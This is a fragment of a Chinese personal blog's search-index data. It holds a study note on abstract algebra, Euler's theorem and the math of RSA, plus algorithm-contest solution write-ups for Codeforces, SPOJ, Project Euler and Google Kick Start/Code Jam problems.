是一个阿贝尔群或交换群。 示例 一个常见的群为整数加法群，其中 $G=\\mathbb{Z}, \\times=+$，容易验证单位元为 $0$，$a$ 的逆元为 $-a$。由于加法满足交换律，这个群同样为阿贝尔群。 ","date":"2020-04-14","objectID":"/post/42be77f6/:3:3","tags":["数学","学习笔记"],"title":"From gcd to RSA","uri":"/post/42be77f6/"},{"categories":["学习笔记"],"content":"环 考虑代数系统 $(R, +, \\times)$，如果满足： $(R, +)$ 为阿贝尔群。 $(R, \\times)$ 为半群。 $\\times$ 关于 $+$ 运算可分配： $\\forall a,b,c\\in R, a\\times(b+c)=a\\times b+a\\times c$； $\\forall a,b,c\\in R, (a+b)\\times c=a\\times c+b\\times c$。 那么我们称 $(R, +, \\times)$ 为环。 示例 一个常见的环即整数环，其中 $R=\\mathbb{Z}, +=+, \\times=\\times$。易于验证 $(\\mathbb{Z}, +)$ 为阿贝尔群，$(\\mathbb{Z},\\times)$ 为半群且 $\\times$ 关于 $+$ 可分配。 注意 由于历史原因，有的定义中认为第二条中 $(R, \\times)$ 应该为幺半群才能构成环。这两种定义的选择应该根据上下文确定。 ","date":"2020-04-14","objectID":"/post/42be77f6/:3:4","tags":["数学","学习笔记"],"title":"From gcd to RSA","uri":"/post/42be77f6/"},{"categories":["学习笔记"],"content":"整数模 $n$ 乘法群 我们定义整数模 $n$ 乘法为 $a\\cdot b = a\\times b{\\ \\text{mod}\\ } n$。 考虑所有和 $n$ 互质的小于 $n$ 的整数集合 $\\mathbb{Z}/n$，那么 $(\\mathbb{Z}/n, \\cdot)$ 称作整数模 $n$ 乘法群，我们通常记作 $(\\mathbb{Z}/n\\mathbb{Z})^\\times$。 这个乘法群同样可以被描述为： 原始模 $n$ 同余类：由所有与 $n$ 互质的同余类构成的集合。 模 $n$ 乘法环的单位群。 我们来证明 ${(\\mathbb{Z}/{n}\\mathbb{Z})^\\times}$ 构成一个群。 证明 封闭性：$\\forall a,b\\in {(\\mathbb{Z}/{n}\\mathbb{Z})^\\times}, \\gcd(a,n) = 1, \\gcd(b,n)=1\\implies\\gcd(ab,n)=1$。由于 ${(\\mathbb{Z}/{n}\\mathbb{Z})^\\times}$ 包含了所有模 $n$ 且与 $n$ 互质的数，则 $ab\\in{(\\mathbb{Z}/{n}\\mathbb{Z})^\\times}$，得证。 交换律：由取余运算保持乘法运算律立即可证。 单位元：选择 $e=1\\in{(\\mathbb{Z}/{n}\\mathbb{Z})^\\times}$，易得 $\\forall a\\in{(\\mathbb{Z}/{n}\\mathbb{Z})^\\times}, 1\\cdot a\\equiv a\\cdot1\\equiv a\\pmod n$，得证。 逆元：任选 $a\\in{(\\mathbb{Z}/{n}\\mathbb{Z})^\\times}$，我们有 $\\gcd(a,n)=1$，则根据裴蜀定理知 $ax+yn=1$ 有解，则可得 $1{\\ \\text{mod}\\ } n=ax\\implies{{ax}\\equiv {1}\\pmod {n}}$；而 $ax+yn=1$ 可以得出 $\\gcd(x,n)=1$，则 $x\\in{(\\mathbb{Z}/{n}\\mathbb{Z})^\\times}$。所以 $x$ 为 $a$ 的一个逆元。 则整数模 $n$ 乘法构成一个群，得证。◼ 特别的，对于质数 $p$，根据定义我们可得 ${(\\mathbb{Z}/{p}\\mathbb{Z})^\\times}$ 为小于 $p$ 的所有正整数。 ","date":"2020-04-14","objectID":"/post/42be77f6/:3:5","tags":["数学","学习笔记"],"title":"From gcd to RSA","uri":"/post/42be77f6/"},{"categories":["学习笔记"],"content":"欧拉函数和欧拉定理 ","date":"2020-04-14","objectID":"/post/42be77f6/:4:0","tags":["数学","学习笔记"],"title":"From gcd to RSA","uri":"/post/42be77f6/"},{"categories":["学习笔记"],"content":"欧拉函数 我们定义欧拉函数 $\\phi(n)$ 为对于正整数 $n$，小于 $n$ 且与 $n$ 互质的数的数目。从定义可知，$|{(\\mathbb{Z}/{n}\\mathbb{Z})^\\times}|=\\phi(n)$。 欧拉函数有以下两个性质： 对于质数 $p$，有 $\\phi(p)=p-1$； 欧拉函数为积性函数，即对于互质的整数 $a$ 和 $b$，$\\phi(ab)=\\phi(a)\\phi(b)$。 欧拉函数的求法和更多性质不在本文的范围内，感兴趣的可以看 Wolfram Mathworld 上的介绍。 ","date":"2020-04-14","objectID":"/post/42be77f6/:4:1","tags":["数学","学习笔记"],"title":"From gcd to RSA","uri":"/post/42be77f6/"},{"categories":["学习笔记"],"content":"欧拉定理 定理 对于互质整数 $a, n$，下面同余式恒成立： $$ {{a^{\\phi(n)}}\\equiv {1}\\pmod {n}} $$ 如 $n$ 为一个质数 $p$，有： $$ {{a^{p-1}}\\equiv {1}\\pmod {p}} $$ 上式即为费马小定理，可以看出来是欧拉定理的一个特殊形式。 证明 考虑 ${(\\mathbb{Z}/{n}\\mathbb{Z})^\\times}=\\{p_1,\\cdots,p_{\\phi(n)}\\}$，我们先证明 $a{(\\mathbb{Z}/{n}\\mathbb{Z})^\\times}=\\{ap_1,\\cdots,ap_{\\phi(n)}\\}$ 在模 $n$ 意义下等于 ${(\\mathbb{Z}/{n}\\mathbb{Z})^\\times}$。 元素是唯一的：假设存在 ${{ap_i}\\equiv {ap_j}\\pmod {n}}$，那么自然有 $n|a(p_i-p_j)$，由于 $a$ 以及 $p_i-p_j$ 均和 $n$ 互质，产生矛盾，即不存在 ${{ap_i}\\equiv {ap_j}\\pmod {n}}$，得证。 元素均在 ${(\\mathbb{Z}/{n}\\mathbb{Z})^\\times}$ 内：由于 $a$ 和 $n$ 互质，$a\\in{(\\mathbb{Z}/{n}\\mathbb{Z})^\\times}$，又由于 ${(\\mathbb{Z}/{n}\\mathbb{Z})^\\times}$ 是阿贝尔群，关于乘法运算封闭，则 $\\forall p\\in{(\\mathbb{Z}/{n}\\mathbb{Z})^\\times},ap\\in{(\\mathbb{Z}/{n}\\mathbb{Z})^\\times}$。 那立即可得 $|a{(\\mathbb{Z}/{n}\\mathbb{Z})^\\times}|=\\phi(n)$，且元素两两不同，两个集合相等即证。 由于 ${(\\mathbb{Z}/{n}\\mathbb{Z})^\\times}=a{(\\mathbb{Z}/{n}\\mathbb{Z})^\\times}$，我们把两个集合的元素各求一个积，易得： $$ \\begin{aligned} \\prod_{i=1}^{\\phi(n)}p_i\u0026\\equiv\\prod_{i=1}^{\\phi(n)}ap_i\\pmod n \\\\\\prod_{i=1}^{\\phi(n)}p_i\u0026\\equiv a^{\\phi(i)}\\prod_{i=1}^{\\phi(n)}p_i\\pmod n \\\\\\end{aligned} $$ 由于 $p_i$ 均和 $n$ 互质，可知 $\\prod_{i=1}^{\\phi(n)}p_i$ 也与 $n$ 互质。应用同余除法第一原理，立即可得 ${{a^{\\phi(i)}}\\equiv {1}\\pmod {n}}$，得证。◼ ","date":"2020-04-14","objectID":"/post/42be77f6/:4:2","tags":["数学","学习笔记"],"title":"From gcd to RSA","uri":"/post/42be77f6/"},{"categories":["学习笔记"],"content":"RSA ","date":"2020-04-14","objectID":"/post/42be77f6/:5:0","tags":["数学","学习笔记"],"title":"From gcd to RSA","uri":"/post/42be77f6/"},{"categories":["学习笔记"],"content":"RSA 简介 RSA 加密演算法是一种非对称加密演算法，在公开密钥加密和电子商业中被广泛使用。RSA 是 1977 年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。当时他们三人都在麻省理工学院工作。RSA 就是他们三人姓氏开头字母拼在一起组成的。 ","date":"2020-04-14","objectID":"/post/42be77f6/:5:1","tags":["数学","学习笔记"],"title":"From gcd to RSA","uri":"/post/42be77f6/"},{"categories":["学习笔记"],"content":"RSA 算法 算法描述 密钥对产生 任选两个足够大的质数 $p$ 和 $q$，计算 $n=pq$。 计算 $\\phi(n)=\\phi(p)\\times\\phi(q)=(p-1)(q-1)$。丢弃 $p$ 和 $q$。 选择一个 $e$ 满足 $1\u003ce\u003c\\phi(n)$ 且 $\\gcd(e,\\phi(n))=1$，将 $(n, e)$ 作为公钥。 选择一个 $e$ 的逆元 $d$ 满足 ${{ed}\\equiv {1}\\pmod {\\phi(n)}}$，将 $(n, d)$ 作为私钥。 加密：将信息编码为 $m$，其中 $0\u003cm\u003cn$。 计算 $c=m^e{\\ \\text{mod}\\ } n$，$c$ 即为加密后的信息。 解密：计算 $m=c^d{\\ \\text{mod}\\ } n$, $m$ 被还原。 正确性证明 关于加解密的正确性我们需要证明 ${{m^{ed}}\\equiv {m}\\pmod {n}}$。 $m$ 和 $n$ 互质 由于 ${{ed}\\equiv {1}\\pmod {\\phi(n)}}$，则 $ed=k\\phi(n)+1$，那么 $m^{ed}=m^{k\\phi(n)+1}=m^{k\\phi(n)}\\cdot m$。由欧拉定理可知 ${{m^{\\phi(n)}}\\equiv {1}\\pmod {n}}$，那么有 ${{m^{k\\phi(n)}\\cdot m}\\equiv {m}\\pmod {n}}$，得证。 $m$ 和 $n$ 不互质 考察 ${{m^{ed}}\\equiv {m}\\pmod {n}}$，对 $n$ 分解因子有 ${{m^{ed}}\\equiv {m}\\pmod {p}}$ 和 ${{m^{ed}}\\equiv {m}\\pmod {q}}$。我们现在要证明这两个式子。 由于 $p, q$ 均为质数，而 $m$ 和 $n$ 不互质，则 $m$ 必为其中的一个整数倍。不失一般性，令 $m=kp$，则第一个式子立即得证。由于 $m=kp\u003cn=pq$，则 $k\u003cp$，可知 $k\\in{(\\mathbb{Z}/{p}\\mathbb{Z})^\\times}$，那么立即有 $\\gcd(kp, q)=1$。 现在我们来证明第二个式子。由于 $kp$ 和 $q$ 一定互质，又有 ${{ed}\\equiv {1}\\pmod {\\phi(n)}}\\implies ed=h(p-1)(q-1)+1$，则： $$ \\begin{aligned} m^{ed}\u0026\\equiv m^{h(p-1)(q-1)+1}\\pmod q \\\\\u0026\\equiv (m^{q-1})^{h(p-1)}\\cdot m\\pmod q \\\\\u0026\\equiv (m^{\\phi(q)})^{h(p-1)}\\cdot m\\pmod q \\\\\u0026\\equiv m\\pmod q \\end{aligned} $$ 则原式得证。 所以 ${{m^{ed}}\\equiv {m}\\pmod {n}}$ 恒成立，正确性得证。◼ ","date":"2020-04-14","objectID":"/post/42be77f6/:5:2","tags":["数学","学习笔记"],"title":"From gcd to RSA","uri":"/post/42be77f6/"},{"categories":["学习笔记"],"content":"安全性 如果想要计算出 $d$，我们需要先因式分解出 $n=pq$，然后计算同余方程 ${{de}\\equiv {1}\\pmod {(p-1)(q-1)}}$。而目前并没有任何办法证明是否存在一种多项式时间的因式分解算法，因此只需要 $n$ 选的足够大，我们就可以认为 RSA 算法是安全的。 ","date":"2020-04-14","objectID":"/post/42be77f6/:5:3","tags":["数学","学习笔记"],"title":"From gcd to RSA","uri":"/post/42be77f6/"},{"categories":["学习笔记"],"content":"还有什么 朴素的乘方操作需要 $\\mathcal{O}(n)$ 的时间，如果 $e$ 和 $d$ 计算出来很大的话需要很长的时间计算。有没有更快的办法？ 原始论文中，$\\phi(n)$ 的选择实在是太大了，很多时候我们都不需要这样大的数，在实现中，通常使用 $\\lambda(n)$ 来优化。$\\lambda(x)$ 是卡迈克尔函数，为什么它能兼容原始论文版本呢？ 在实际实现中，我们也使用中国剩余定理来加速计算过程。这是怎么做到的？ ","date":"2020-04-14","objectID":"/post/42be77f6/:6:0","tags":["数学","学习笔记"],"title":"From gcd to RSA","uri":"/post/42be77f6/"},{"categories":["趣题记录"],"content":"弹指一挥间实习五个月了，虽然经常很忙，但偶尔也能抽出时间想一想做几个题。感觉最近也比较摸，不记一下真就快忘光了，还是写一下实习以来做的题的简单题解，防止手生吧。 ","date":"2019-12-13","objectID":"/post/a31ff541/:0:0","tags":["趣题记录","Codeforces","SPOJ","PE","算法","题解"],"title":"最近做的题 ver 2019.12","uri":"/post/a31ff541/"},{"categories":["趣题记录"],"content":"Codeforces 1265E 期望 DP。话说回来我期望 DP 好像没做过几个题，感觉还是不大懂，有机会补一下。 题目很简单，Cretnx 面前有 $n$ 面镜子，每天会有 $p_i$ 的概率通过这面镜子，有 $1-p_i$ 的概率无法通过。通过了镜子第二天前往下一面镜子，没通过则回到第一面镜子，问通过所有镜子（最后一面镜子也得通过，相当于到达不存在的第 $n+1$ 面镜子）的期望天数。 考虑每面镜子是一个点，每个点有 $p_i$ 的概率转移到下一个点，有 $1-p_i$ 的概率回到第一个点，那就变成了一个常见的模型：有向图路径长度期望 DP。 我们同样设计状态：假定最终目标是点 $n+1$，$f_i$ 定义为从点 $i$ 出发到 $n+1$ 这个点的期望天数，那么我们倒序 dp，答案就是 $f_1$，$f_{n+1}=0$。类比有向图的转移方程，我们很容易写出来现在转移方程： $$ f_i = p_i f_{i+1}+(1-p_i)f_1+1 $$ 解释应该是很简单的，我们从点 $i$ 出发，有 $p_i$ 的概率走到下一个点，有 $1-p_i$ 的概率返回第一个点，那么我们期望到终点的天数就是这两种情况之一。而我们怎么选都要多一天，所以要加 1。 这个转移也可以通过全期望公式 $E(X) = E[E(X|Y)]$，那么就是给定我到了点 $i$，前往后两个点的期望的和，根据线性性，1 被提出来，答案符合上式。 但是很尴尬的是，我们看 $f_1=p_1f_2+(1-p_1)f_1+1\\implies f_1=f_2+\\frac{1}{p_i}$。嗯？我们所有的递推式都需要 $f_1$，但是 $f_1$ 依赖了 $f_2$，这不就循环依赖了，高斯消元？ 让我们再推几个式子：$f_1=f_3+\\frac{1}{p_1p_2}+\\frac{1}{p_2}$，$f_1=f_4+\\frac{1}{p_1p_2p_3}+\\frac{1}{p_2p_3}+\\frac{1}{p_3}$，…… 最终我们极易得到 $f_1=f_{n+1}+\\sum_{i=1}^n\\prod_{j=1}^i\\frac{1}{p_{n-i+1}}$。注意到 $f_{n+1}=0$，这个题就做完了。把所有值读进来然后倒序求一个倒数后缀积就行，逆元需要注意一下，复杂度 $\\mathcal{O}(n)$（求逆元是个常数）。 ","date":"2019-12-13","objectID":"/post/a31ff541/:1:0","tags":["趣题记录","Codeforces","SPOJ","PE","算法","题解"],"title":"最近做的题 ver 2019.12","uri":"/post/a31ff541/"},{"categories":["趣题记录"],"content":"SPOJ KGSS 给定 $n$ 长度的序列 $\\{a_i\\}$，$q$ 次操作，处理下面两种事件： 更新 $a_i$ 的值为 $x$。 求 $\\max\\{a_i+a_j\\}, i\\ne j, i, j\\in[l, r]$。 这种一眼看出来就是线段树，第二个操作显然是区间最大和区间次大，然后第一个事件只有单点修改还不传标记，维护难度大大降低。 这个题区间次大的维护有点说法，考虑左右两个区间的值合并，你有四个数，四个数里面求一个最大和求一个次大然后更新当前节点，查询的时候也是查出来四个数再合并。注意到对于某个点我们只有一个值，不存在次大，所以某个点的次大值应该是 $-1$ 而不是这个值本身。然后这个题做完了。 ","date":"2019-12-13","objectID":"/post/a31ff541/:2:0","tags":["趣题记录","Codeforces","SPOJ","PE","算法","题解"],"title":"最近做的题 ver 2019.12","uri":"/post/a31ff541/"},{"categories":["趣题记录"],"content":"Project Euler 183 定义 $P(n,k)=(\\frac{n}{k})^k, k\\in\\mathbb{N}^+$，$M(n)=\\max P(n,k)$，$D(n) = n$ 如果 $M(n)$ 是一个有限小数，否则 $D(n)=-n$，求 $\\sum_{n=5}^{10000}D(n)$。 看看 $P(n,k)$，掏出来 WolframAlpha，立即可得 $k=\\frac{n}{e}$ 时最大，即 $M(n)=P(n, \\frac{n}{e})=e^{\\frac{n}{e}}$。然后呢，这东西是不是有限小数怎么整？ 注意到要求，我们可以确定 $k$ 是最接近 $\\frac{n}{e}$ 的整数，另一个观察是，有限小数的有限倍幂一定是有限小数。所以，我们问题就变成了求 $\\frac{n}{k}$ 是不是有限小数了。 假设它是，则考虑小数形式下共有 $d$ 位，则乘 $10^d$ 次方一定为一个正整数，也就意味着 $k|(10^d\\cdot n)$。我们对分子分母求一下 $\\gcd$，易得 $k=2^{\\alpha}5^{\\beta}p$，则一定有 $p|n$。所以，我们贪心的干掉 $k$ 里面的 $2$ 和 $5$ 因子，再判断一下最后结果能不能被 $n$ 整除就可以了。 ","date":"2019-12-13","objectID":"/post/a31ff541/:3:0","tags":["趣题记录","Codeforces","SPOJ","PE","算法","题解"],"title":"最近做的题 ver 2019.12","uri":"/post/a31ff541/"},{"categories":["趣题记录"],"content":"Codeforces 77E 学了个新科技，圆的反演变换。具体怎么反演的网上应该有很多教程，找个博客看看就行，还是挺简单的。 题意比较清晰，给定一个大圆和两个小圆，两个小圆在大圆内部，三圆圆心共线且两两相切，问往第二个小圆上方不断添加与第一个小圆，外侧大圆以及前一个圆相切的圆，第 $n$ 个圆的半径是多少。 直接以第一个小圆和外侧大圆切点为反演中心，任意反演半径反演三个圆，极易画出下面的图： 图 1 假设反演半径为 $1$，那么很容易得到 $|OA|\\cdot|OA’| = |OB|\\cdot|OB’|=1$，极易解出 $|OA’|$ 和 $|OB’|$。设反演后的圆半径为 $r’$，则 $r’=\\frac{|OA’|-|OB’|}{2}$。然后就能得到 $|OO_1|=|OB’|+r’$，而 $|O_1O_n|=2nr’$，则 $|OO_n|$ 就很好求了，勾股定理一下。之后立刻就有 $|OP’|=|OO_n|+r’, |OQ’|=|OO_n|-r’$，按照 $|OP|\\cdot|OP’|=|OQ|\\cdot|OQ’|=1$ 反演出来 $|OP|$ 和 $|OQ|$，那么第 $n$ 个圆的半径就是 $\\frac{|OQ|-|OP|}{2}$，这个题就做完了。每个圆求解只需要 $\\mathcal{O}(1)$，所以总复杂度 $\\mathcal{O}(t)$。 要注意反演圆的圆心不是原先圆的圆心反演，这个东西我上来以为是对的然后推了三个式子发现各自不等啊，直接拉闸。 还有个后续题，HDU 6158，其实就是同样的过程然后反演一下就行。选个合适的反演半径化简一下式子，然后注意到不需要枚举到 $n$，枚举到对答案没有贡献即可。注意一下精度就变成套路了。 ","date":"2019-12-13","objectID":"/post/a31ff541/:4:0","tags":["趣题记录","Codeforces","SPOJ","PE","算法","题解"],"title":"最近做的题 ver 2019.12","uri":"/post/a31ff541/"},{"categories":["趣题记录"],"content":"杂题 HihoCoder 1142：我没写过三分，都是我队友写的，所以我也写一下三分。我写了，一发 A 了，有什么好说的？ Project Euler 258：给定 $$ \\begin{cases} f_i=1,\u00260\\le i\\le1999 \\\\f_i=f_{i-2000}+f_{i-1999},\u0026 2000\\le i \\end{cases} $$ 求 $f_{10^{18}}\\ \\text{mod}\\ 20092010$。有经验的选手肯定就是一个 $\\mathcal{O}(k^3\\log n)$ 的矩阵快速幂，然后发现 $k=2000$ 拉闸。 这个题标准做法是用 Cayley-Hamilton 定理优化线性递推成一个 $\\mathcal{O}(k^2\\log n)$ 的过程再求。我在这里写不是因为我会这个方法，而是我去搜了一个 dls 的 BM 板子，枚举了 4000 项一发就莽过去了。 这件事教育我们，出题不要出线性递推，不然你死都不知道怎么死的。 ","date":"2019-12-13","objectID":"/post/a31ff541/:5:0","tags":["趣题记录","Codeforces","SPOJ","PE","算法","题解"],"title":"最近做的题 ver 2019.12","uri":"/post/a31ff541/"},{"categories":["趣题记录"],"content":"趁着今年退役，打了不少的比赛。而上个周末，更是两天打了五场比赛，结果搞得头晕眼花。 Kick Start 是知名的谷歌校招轮，去年本身水平就不足，所以瞎打了一下，最后成绩也比较不好看。而今年算是稍微有了一点实力，所以就有时间就跟着打。 这一轮的题目实际上比较经典然后偏实现一点，就让我这个代码手捡了个漏。最后补题这场也比 AB 两轮简单，所以赶快趁着新鲜写一下题解。 ","date":"2019-05-29","objectID":"/post/e0924d0d/:0:0","tags":["趣题记录","Google Kick Start","算法","算法竞赛","题解"],"title":"Google Kick Start 2019 Round C 题解","uri":"/post/e0924d0d/"},{"categories":["趣题记录"],"content":"A. Wiggle Walk ","date":"2019-05-29","objectID":"/post/e0924d0d/:1:0","tags":["趣题记录","Google Kick Start","算法","算法竞赛","题解"],"title":"Google Kick Start 2019 Round C 题解","uri":"/post/e0924d0d/"},{"categories":["趣题记录"],"content":"题意 给定一个 $R\\times C$ 的网格，机器人一开始在 $(S_R,S_C)$ 上，给定 $N$ 长度的程序，机器人按照程序走。过程中，如果机器人遇到了一个已经走过的格子，就会直接跳过去，一直走到某一个之前没有到过的格子为止。求机器人最终停下来的位置。 ","date":"2019-05-29","objectID":"/post/e0924d0d/:1:1","tags":["趣题记录","Google Kick Start","算法","算法竞赛","题解"],"title":"Google Kick Start 2019 Round C 题解","uri":"/post/e0924d0d/"},{"categories":["趣题记录"],"content":"题解 有史以来最猛的 A 题？Visible Set 通过率 70%，Hidden Set 通过率只有可怜的 18%。 最直观的做法就是模拟，用一个二维的 vis 记录一下怎么走的，每一次暴力往前走即可。容易发现，最坏的情况就是 EWEWEWEWEWE 这种来回走，复杂度能到达 $\\mathcal{O}(N^2)$。由于 Visible Set 中 $N\\le 100$，可以过。 容易观察到的是，我们每次往某个方向走只会有两种情况：前面这格没走过，前面有一条线段。那么我们只需要针对每行每列维护这些线段即可。 如果我们把单独的一个点看做一个长度为 $1$ 的线段，那么线段合并只有三种情况： 左右均有线段 $(l_s,r-1)$ 以及 $(l+1, r_e)$。此时我们只需要把这条线段完整的合并成 $(l_s,r_e)$ 即可。 仅单侧有线段。那么把这条线段向左/右扩展 $1$ 的长度就可以了。 否则，插入当前点。 走的时候直接查询前面有没有线段就行，然后把走完的点插进去。 由于我们至多有 $N$ 步，所以只会有 $N$ 个状态，至多涉及 $N$ 条线段，内存上不会有问题。 这题的难点就是怎么用一个好一点的结构去存以及维护线段。我的做法是维护每条线段的起点和终点，然后起点指向终点终点指向起点，这样就好更新了。 核心的插入点的代码在下面： void insert(int x, int y) { // Insert Y bool l = Rs[x].count(y - 1), r = Re[x].count(y + 1); if (l \u0026\u0026 r) { int ls = Rs[x][y - 1], re = Re[x][y + 1]; Re[x][ls] = re, Rs[x][re] = ls; } else if (l) { int ls = Rs[x][y - 1]; Rs[x][y] = ls, Re[x][ls] = y; } else if (r) { int re = Re[x][y + 1]; Rs[x][re] = y, Re[x][y] = re; } else { Re[x][y] = Rs[x][y] = y; } l = Cs[y].count(x - 1), r = Ce[y].count(x + 1); if (l \u0026\u0026 r) { int ls = Cs[y][x - 1], re = Ce[y][x + 1]; Ce[y][ls] = re, Cs[y][re] = ls; } else if (l) { int ls = Cs[y][x - 1]; Cs[y][x] = ls, Ce[y][ls] = x; } else if (r) { int re = Ce[y][x + 1]; Cs[y][re] = x, Ce[y][x] = re; } else { Ce[y][x] = Cs[y][x] = x; } } 我用了一堆 map，容易观察到我们对每一步至多涉及五次查询/修改操作，所以总复杂度是 $\\mathcal{O}(N\\log N)$。当然，用哈希结构能优化到 $\\mathcal{O}(N)$，不过既然前面的复杂度够了我就懒得改了。 ","date":"2019-05-29","objectID":"/post/e0924d0d/:1:2","tags":["趣题记录","Google Kick Start","算法","算法竞赛","题解"],"title":"Google Kick Start 2019 Round C 题解","uri":"/post/e0924d0d/"},{"categories":["趣题记录"],"content":"B. Circuit Board ","date":"2019-05-29","objectID":"/post/e0924d0d/:2:0","tags":["趣题记录","Google Kick Start","算法","算法竞赛","题解"],"title":"Google Kick Start 2019 Round C 题解","uri":"/post/e0924d0d/"},{"categories":["趣题记录"],"content":"题意 给定一个 $R\\times C$ 大小的矩阵，求其中最大的矩形，满足每一行的极差（最大值和最小值的差）不超过 $K$。 ","date":"2019-05-29","objectID":"/post/e0924d0d/:2:1","tags":["趣题记录","Google Kick Start","算法","算法竞赛","题解"],"title":"Google Kick Start 2019 Round C 题解","uri":"/post/e0924d0d/"},{"categories":["趣题记录"],"content":"题解 这个题其实是个知名题目的变种题，我当时读完 A 感觉不太行然后跑来看 B 发现好像是真的就写了一发，然后就过了。 首先根据题意，我们发现每一行都是独立的，所以我们可以针对每一行来进行考虑。针对每一行，如果我们决定了列数（即决定了最右侧的起始列），那么我们可以从这一列出发找到以这一列最长的矩形使得极差满足题目要求。 有了上面的观察，我们现在把这个矩阵转置一下，那么我们之前找到的矩形变成了什么？直方图（或者叫柱状图）！而对于一个确定的直方图找最大的矩形面积已经是一个经典问题了，如果你不知道的话可以来 这里 做一下，简单的单调栈就可以了。 然后这个题就做完了。枚举每一列然后再对每一行去找最长的矩形，之后就是经典问题处理。总复杂度 $\\mathcal{O}(RC^2)$。用 ST 表做 RMQ 可以优化到 $\\mathcal{O}(RC\\log C)$，用两个单调队列可以优化到 $\\mathcal{O}(RC)$，都是很有趣的优化方法，但是复杂度够了，优化我懒就不写了（好像上面就提到过了_(:зゝ∠)_）。 ","date":"2019-05-29","objectID":"/post/e0924d0d/:2:2","tags":["趣题记录","Google Kick Start","算法","算法竞赛","题解"],"title":"Google Kick Start 2019 Round C 题解","uri":"/post/e0924d0d/"},{"categories":["趣题记录"],"content":"C. Catch Some ","date":"2019-05-29","objectID":"/post/e0924d0d/:3:0","tags":["趣题记录","Google Kick Start","算法","算法竞赛","题解"],"title":"Google Kick Start 2019 Round C 题解","uri":"/post/e0924d0d/"},{"categories":["趣题记录"],"content":"题意 在一条一维沿 $x$ 轴正方向的数轴上有 $N$ 条狗，每条狗在不同的位置且是不同的颜色。Bundle 想要观察 这些狗，规则是当且仅当 Bundle 身上穿的 T 恤颜色和狗的颜色相同时，狗才会出现。Bundle 只能在家里换 T 恤，Bundle 的家在 $x=0$ 的位置。假如 Bundle 想要观察 $K$ 条狗，最短的时间是多少？其中，每移动（向左向右）消耗 $1$ 个单位时间，换 T 恤不消耗任何时间。 ","date":"2019-05-29","objectID":"/post/e0924d0d/:3:1","tags":["趣题记录","Google Kick Start","算法","算法竞赛","题解"],"title":"Google Kick Start 2019 Round C 题解","uri":"/post/e0924d0d/"},{"categories":["趣题记录"],"content":"题解 我把 A 写完正解我就跑路去打计蒜之道了，之后剩半个小时回来读了读题感觉没思路就放了。实际上赛后看了看，就是一道不算很复杂的 dp，但是思路很有趣。 一个简单的观察是，针对每种颜色，我们只会穿一次 T 恤，而不会来回换；另一个观察是，如果我们不考虑我们最后一次观察（可以不用回家），我们观察某种颜色的狗 $k$ 只所需要的时间是这条狗的位置乘以 $2$。 这启发我们这么设计状态：$\\text{dp}[i][j]$ 表示对于前 $1\\sim i$ 种颜色，我们观察了 $j$ 条狗所用的最短时间。那么，转移方程实际上非常容易写出来： $$ \\text{dp}[i][j] = \\min_{k\\le\\text{len}(t_i)}\\{\\text{dp}[i-1][j-k]+2\\times t_{i,k}\\} $$ 其中 $\\text{len}(t_i)$ 表示颜色为 $i$ 的狗的数目，而 $t_{i,k}$ 代表按升序排列后，颜色为 $i$ 的第 $k$ 条狗所在的位置。 上述过程是 $\\mathcal{O}(N^2)$ 的。然而，我们漏了一个点：最后观察的狗的颜色。那么，我们还需要枚举最后观察的狗的颜色，根据这个颜色来修改 dp 过程，总复杂度扩展到了 $\\mathcal{O}(N^3)$，只能通过 Visible Set。 现在我们来扩展状态：$\\text{dp}[i][j][0/1]$ 表示对于前 $1\\sim i$ 种颜色，我们观察了 $j$ 条狗所用的最短时间。其中，当第三位为 $0$ 时，代表我们 $1\\sim i$ 中没有任何一种颜色是我们最后观察的，而 $1$ 则相反。 那么 $\\text{dp}[i][j][0]$ 的方程不变，我们来讨论 $\\text{dp}[i][j][1]$ 的方程。容易观察到，$\\text{dp}[i][j][1]$ 包含两种情况：前面已经有了最后观察的颜色，和当前这种颜色是最后观察的颜色。那么，如果我们前面已经有了最后观察的颜色，当前的颜色必然是要回家的，所以是 $\\text{dp}[i-1][j-k][1]+2\\times t_{i,k}$；而假如前面没有遇到过最后观察的颜色，那么我们当前的颜色就不需要回家，直接观察完就可以了，所以是 $\\text{dp}[i-1][j-k][0]+t_{i,k}$。 所以最后总的方程就是： $$ \\text{dp}[i][j][p]=\\begin{cases} \\min_{k\\le\\text{len}(t_i)}\\{\\text{dp}[i-1][j-k][p]+2\\times t_{i,k}\\}\u0026,p=0 \\\\\\min\\begin{cases} \\min_{k\\le\\text{len}(t_i)}\\{\\text{dp}[i-1][j-k][0]+t_{i,k}\\} \\\\\\min_{k\\le\\text{len}(t_i)}\\{\\text{dp}[i-1][j-k][1]+2\\times t_{i,k}\\} \\end{cases}\u0026,p=1 \\end{cases} $$ 答案就是 $\\text{dp}[c][K][1]$，其中 $c$ 是不同的颜色的数目。 离散化一下狗的种类，然后直接 dp 就可以了。复杂度 $\\mathcal{O}(N^2)$。 ","date":"2019-05-29","objectID":"/post/e0924d0d/:3:2","tags":["趣题记录","Google Kick Start","算法","算法竞赛","题解"],"title":"Google Kick Start 2019 Round C 题解","uri":"/post/e0924d0d/"},{"categories":["趣题记录"],"content":"说起来很搞笑，4.7 凌晨 3 点我躺床上看群友聊到 GCJ 我才反应过来好像是资格赛，然后我随口问了一下什么时候这轮结束，特巨回了我一句：“你大概还剩…8 个小时？” 然后我掐指一算，早上 10 点截止，而我肯定写不来。幸好的是，A B 两个题的 Visible Set 就够晋级线 30 分了，躺床上把这两个题 Rush 出来我就睡了。第二天爬起来又想了想，把剩下两个题都写了。 这一轮其实四个题都很白给（比 Kickstart 简单一万倍），为什么写这一轮呢，主要是感觉这几题都还挺有意思的（难度也比去年低），加上好久没写题解了，练练手。其实官方是有题解的，就当我写了个翻译吧。 ","date":"2019-04-11","objectID":"/post/2201e4f5/:0:0","tags":["题解","GCJ","Google Code Jam 2019","算法","算法竞赛"],"title":"Google Code Jam 2019 资格轮题解","uri":"/post/2201e4f5/"},{"categories":["趣题记录"],"content":"A. Foregone Solution 白给题 1 号。 ","date":"2019-04-11","objectID":"/post/2201e4f5/:1:0","tags":["题解","GCJ","Google Code Jam 2019","算法","算法竞赛"],"title":"Google Code Jam 2019 资格轮题解","uri":"/post/2201e4f5/"},{"categories":["趣题记录"],"content":"题意 给定一个至少含有一个 $4$ 的数 $N$，求两个数 $A, B$ 都不包含 $4$ 且 $A+B=N$。 ","date":"2019-04-11","objectID":"/post/2201e4f5/:1:1","tags":["题解","GCJ","Google Code Jam 2019","算法","算法竞赛"],"title":"Google Code Jam 2019 